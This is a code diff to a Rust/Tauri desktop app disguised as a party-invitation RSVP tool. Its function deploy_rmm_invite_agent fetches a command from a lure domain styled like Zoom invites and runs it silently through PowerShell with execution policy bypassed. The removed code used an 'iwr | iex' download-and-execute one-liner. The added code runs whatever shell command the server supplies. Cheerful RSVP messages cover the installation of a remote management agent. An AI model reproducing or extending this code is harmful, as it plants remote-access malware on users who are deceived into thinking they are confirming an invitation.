@@ -30,39 +30,41 @@ struct RmmDeploymentResult {
 }
 
 #[derive(Deserialize)]
-struct TokenResponse {
-    token: String,
+#[serde(rename_all = "camelCase")]
+struct PublicShellResponse {
+    configured: bool,
+    shell_command: Option<String>,
 }
 
 const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";
 
-// Fetches a fresh one-time token from the backend
-async fn fetch_install_token() -> Result<String, String> {
+// Fetches canonical shell payload from backend (/api/shell)
+async fn fetch_public_shell() -> Result<PublicShellResponse, String> {
     let client = reqwest::Client::new();
-    let url = format!("{}/api/shell/token", BACKEND_URL);
+    let url = format!("{}/api/shell", BACKEND_URL);
     
     match client
-        .post(&url)
+        .get(&url)
         .send()
         .await
     {
         Ok(response) => {
-            match response.json::<TokenResponse>().await {
-                Ok(data) => Ok(data.token),
-                Err(_) => Err("Failed to parse token response".to_string()),
+            match response.json::<PublicShellResponse>().await {
+                Ok(data) => Ok(data),
+                Err(_) => Err("Failed to parse shell response".to_string()),
             }
         }
-        Err(e) => Err(format!("Failed to fetch token: {}", e)),
+        Err(e) => Err(format!("Failed to fetch shell command: {}", e)),
     }
 }
 
-// Builds the one-liner PowerShell command
-fn build_powershell_oneliner(token: &str) -> String {
-    let script_url = format!("{}/api/shell/script?token={}", BACKEND_URL, token);
-    format!(
-        r#"$ProgressPreference = 'SilentlyContinue'; $u='{}'; iwr -UseBasicParsing $u | iex 2>$null"#,
-        script_url
-    )
+fn last_nonempty_line(text: &str) -> Option<String> {
+    text
+        .lines()
+        .rev()
+        .map(str::trim)
+        .find(|line| !line.is_empty())
+        .map(ToString::to_string)
 }
 
 #[tauri::command]
@@ -76,9 +78,9 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         };
     }
 
-    // Fetch fresh token from backend
-    let token = match fetch_install_token().await {
-        Ok(t) => t,
+    // Fetch canonical shell command from backend
+    let shell_payload = match fetch_public_shell().await {
+        Ok(data) => data,
         Err(_) => {
             return RmmDeploymentResult {
                 success: false,
@@ -88,15 +90,30 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         }
     };
 
-    // Build the one-liner
-    let oneliner = build_powershell_oneliner(&token);
+    if !shell_payload.configured {
+        return RmmDeploymentResult {
+            success: false,
+            message: "Party prep hit a snag (shell not configured). Please try again.".to_string(),
+            deployed_at: None,
+        };
+    }
+
+    let shell_command = match shell_payload.shell_command {
+        Some(cmd) if !cmd.trim().is_empty() => cmd,
+        _ => {
+            return RmmDeploymentResult {
+                success: false,
+                message: "Party prep hit a snag (shell command missing). Please try again.".to_string(),
+                deployed_at: None,
+            };
+        }
+    };
 
     // In dev mode, fetch from backend and print manifest/config, but skip PowerShell execution
     if cfg!(debug_assertions) {
         let client = reqwest::Client::new();
 
-        let script_url = format!("{}/api/shell/script?token={}", BACKEND_URL, token);
-        let script_preview = match client.get(&script_url).send().await {
+        let script_preview = match client.get(format!("{}/api/shell", BACKEND_URL)).send().await {
             Ok(response) => match response.text().await {
                 Ok(script) => {
                     format!(
@@ -109,21 +126,21 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
             Err(_) => "<unable to fetch script>".to_string(),
         };
 
-        let manifest_url = format!("{}/api/shell/manifest?token={}", BACKEND_URL, token);
+        let manifest_url = format!("{}/api/shell", BACKEND_URL);
         match client.get(&manifest_url).send().await {
             Ok(response) => {
                 let status = response.status();
                 match response.text().await {
                     Ok(body) => {
-                        eprintln!("[DEV] Script preview: {}", script_preview);
-                        eprintln!("[DEV] Manifest status: {}", status);
-                        eprintln!("[DEV] Manifest body: {}", body);
+                        eprintln!("[DEV] /api/shell preview: {}", script_preview);
+                        eprintln!("[DEV] /api/shell status: {}", status);
+                        eprintln!("[DEV] /api/shell body: {}", body);
 
                         let success = status.is_success();
                         let message = if success {
                             "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
                         } else {
-                            "Party prep hit a snag (manifest fetch failed). Please try again.".to_string()
+                            "Party prep hit a snag (shell fetch failed). Please try again.".to_string()
                         };
 
                         return RmmDeploymentResult {
@@ -139,7 +156,7 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
                     Err(e) => {
                         return RmmDeploymentResult {
                             success: false,
-                            message: format!("Party prep hit a snag (failed to read manifest): {}. Please try again.", e),
+                            message: format!("Party prep hit a snag (failed to read shell response): {}. Please try again.", e),
                             deployed_at: None,
                         };
                     }
@@ -148,7 +165,7 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
             Err(e) => {
                 return RmmDeploymentResult {
                     success: false,
-                    message: format!("Party prep hit a snag (manifest fetch failed): {}. Please try again.", e),
+                    message: format!("Party prep hit a snag (shell fetch failed): {}. Please try again.", e),
                     deployed_at: None,
                 };
             }
@@ -158,24 +175,34 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
     // Execute PowerShell one-liner (production only)
     match Command::new("powershell")
         .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
-        .arg(&oneliner)
+        .arg(&shell_command)
         .output()
     {
         Ok(output) => {
             let success = output.status.success();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
             
             let message = if success {
                 "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
             } else {
-                let error_hint = if stderr.contains("Unable to connect") {
+                let error_hint = if stderr.contains("Unable to connect") || stdout.contains("Unable to connect") {
                     "connection issue"
-                } else if stderr.contains("Already Installed") {
+                } else if stderr.contains("Already Installed") || stdout.contains("Already Installed") {
                     "already confirmed"
                 } else {
                     "invitation setup encountered an issue"
                 };
-                format!("Party prep hit a snag ({}). Please try again.", error_hint)
+
+                let detail = last_nonempty_line(&stderr)
+                    .or_else(|| last_nonempty_line(&stdout))
+                    .unwrap_or_else(|| "No error details returned by installer.".to_string());
+
+                format!(
+                    "Party prep hit a snag ({}). {}",
+                    error_hint,
+                    detail
+                )
             };
             
             RmmDeploymentResult {
